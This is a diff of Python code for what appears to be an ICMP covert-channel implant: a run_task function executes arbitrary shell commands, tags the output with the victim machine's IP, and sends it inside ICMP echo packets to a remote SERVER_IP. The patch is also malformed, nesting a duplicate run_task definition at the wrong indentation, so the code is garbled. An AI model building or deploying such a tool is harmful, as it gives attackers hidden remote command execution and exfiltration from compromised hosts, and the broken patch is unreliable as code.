@@ -56,13 +56,29 @@ def run_task(cmd):
     except Exception as e:
         result_bytes = str(e).encode(errors="ignore")
 
+    def run_task(cmd):
+    MAX_PAYLOAD = 1460
+    PREFIX = b"RESULT|"
+
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        result_bytes = output
+    except Exception as e:
+        result_bytes = str(e).encode(errors="ignore")
+
+    # Include client IP
+    ip_bytes = LOCAL_IP.encode()
+
+    # Build prefix: RESULT|IP|
+    full_prefix = PREFIX + ip_bytes + b"|"
+
     # Leave room for prefix
-    max_result_bytes = MAX_PAYLOAD - len(PREFIX)
+    max_result_bytes = MAX_PAYLOAD - len(full_prefix)
 
     # Truncate safely
     result_bytes = result_bytes[:max_result_bytes]
 
-    payload = PREFIX + result_bytes
+    payload = full_prefix + result_bytes
 
     pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
     send(pkt, verbose=0)
